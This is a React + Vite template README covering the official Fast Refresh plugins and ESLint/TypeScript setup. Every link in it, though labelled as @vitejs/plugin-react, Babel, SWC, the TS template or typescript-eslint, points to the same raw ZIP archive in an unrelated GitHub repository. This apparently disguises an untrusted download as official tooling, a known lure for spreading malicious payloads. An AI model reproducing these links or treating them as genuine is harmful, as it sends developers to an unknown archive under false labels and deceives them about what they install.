# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/kartik359/iplProject/raw/refs/heads/main/src/Project-ipl-v2.5.zip) uses [Babel](https://github.com/kartik359/iplProject/raw/refs/heads/main/src/Project-ipl-v2.5.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/kartik359/iplProject/raw/refs/heads/main/src/Project-ipl-v2.5.zip) uses [SWC](https://github.com/kartik359/iplProject/raw/refs/heads/main/src/Project-ipl-v2.5.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/kartik359/iplProject/raw/refs/heads/main/src/Project-ipl-v2.5.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/kartik359/iplProject/raw/refs/heads/main/src/Project-ipl-v2.5.zip) in your project.
